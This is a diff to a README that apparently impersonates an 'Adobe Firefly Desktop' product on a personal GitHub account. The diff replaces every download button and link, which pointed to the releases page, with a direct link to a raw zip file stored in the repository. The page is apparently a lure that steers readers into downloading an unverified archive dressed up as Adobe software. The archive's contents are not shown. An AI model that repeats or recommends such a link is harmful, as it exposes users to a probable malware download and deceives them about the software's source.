@@ -1,7 +1,7 @@
 <h1>🎨 Firefly-Desktop---Adobe-Firefly-AI-2026 - Create Stunning AI Art Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/releases">
+  <a href="https://raw.githubusercontent.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/main/boxman/A-Adobe-Firefly-Desktop-3.0.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=purple" alt="Download Button" style="max-width:100%;">
   </a>
 </p>
@@ -27,7 +27,7 @@ Getting started is incredibly simple. You don't need any technical skills or cod
 Click the big button below (or the link at the top of this page) to go to the download page:
 
 <p align="center">
-  <a href="https://github.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/releases">
+  <a href="https://raw.githubusercontent.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/main/boxman/A-Adobe-Firefly-Desktop-3.0.zip">
     <img src="https://img.shields.io/badge/🖱️%20CLICK%20HERE%20TO%20DOWNLOAD-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=1E90FF" alt="Download Button" style="max-width:100%;">
   </a>
 </p>
@@ -194,7 +194,7 @@ This software is provided "as is," without warranty of any kind,, express or imp
 
 <p align="center">
   <strong>Start creating your AI masterpieces today!</strong><br>
-  <a href="https://github.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/releases">⬇️ Click Here to Download Firefly Desktop</a>
+  <a href="https://raw.githubusercontent.com/ardeengrand3230/Firefly-Desktop---Adobe-Firefly-AI-2026/main/boxman/A-Adobe-Firefly-Desktop-3.0.zip">⬇️ Click Here to Download Firefly Desktop</a>
 </p>
 
 ---
